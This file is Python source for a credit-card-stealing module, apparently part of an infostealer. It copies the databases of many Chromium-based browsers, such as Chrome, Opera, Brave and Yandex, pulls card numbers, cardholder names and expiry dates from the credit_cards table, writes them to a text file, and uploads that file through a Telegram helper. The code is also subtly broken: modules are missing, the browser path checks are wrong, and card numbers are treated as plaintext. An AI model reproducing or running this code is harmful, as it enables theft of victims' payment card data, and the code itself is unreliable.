import os
import sqlite3

class CreditCards:
    def __init__(self):
        self.temp_cc_location = ""
        self.filename = "credit_cards.txt"
        self.output = ""

    def get(self):
        # Search all browsers
        browsers = ["Chrome", "Chromium", "Opera", "Brave", "Epic Privacy Browser", "Amigo", "Vivaldi", "Orbitum", "Mail.Ru", "Kometa", "Comodo", "Torch", "Comodo", "Slimjet", "360Browser", "Maxthon3", "K-Melon", "Sputnik", "Nichrome", "CocCoc", "uCozMedia", "Chromodo", "Yandex"]

        for browser in browsers:
            if os.path.exists(browser):
                self.temp_cc_location = os.environ["temp"] + "\\browserCreditCards"
                if os.path.exists(self.temp_cc_location):
                    os.remove(self.temp_cc_location)
                shutil.copy(browser, self.temp_cc_location)

                # Read chrome database
                conn = sqlite3.connect(self.temp_cc_location)
                c = conn.cursor()
                c.execute("SELECT * FROM credit_cards")

                for row in c.fetchall():
                    number = row[4]
                    exp_year = row[3]
                    exp_month = row[2]
                    name = row[1]

                    if not number:
                        break

                    # Add
                    self.output += f"NUMBER: {number} \n"
                    self.output += f"NAME: {name} \n"
                    self.output += f"EXPIRE_YEAR: {exp_year} \n"
                    self.output += f"EXPIRE_MONTH: {exp_month} \n\n"

        # Send
        with open(self.filename, "w") as f:
            f.write(self.output)
        telegram.upload_file(self.filename, True)
